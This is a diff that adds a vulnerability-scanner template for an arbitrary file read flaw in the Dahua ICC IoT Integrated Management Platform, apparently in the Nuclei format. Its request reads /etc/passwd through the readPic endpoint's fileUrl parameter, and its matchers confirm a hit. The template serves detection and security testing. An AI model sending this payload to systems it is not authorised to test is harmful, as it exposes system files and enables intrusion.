@@ -1,0 +1,23 @@
+id: poc-yaml-dahua-icc-readpic-anyfileread
+info:
+  name: Dahua ICC IoT Integrated Management Platform ReadPic Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+http:
+  - method: GET
+    path:
+      - "/evo-apigw/evo-cirs/file/readPic?fileUrl=file:/etc/passwd"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "root:"
+          - "/bin"
+      - type: word
+        words:
+          - "<"
+        negative: true
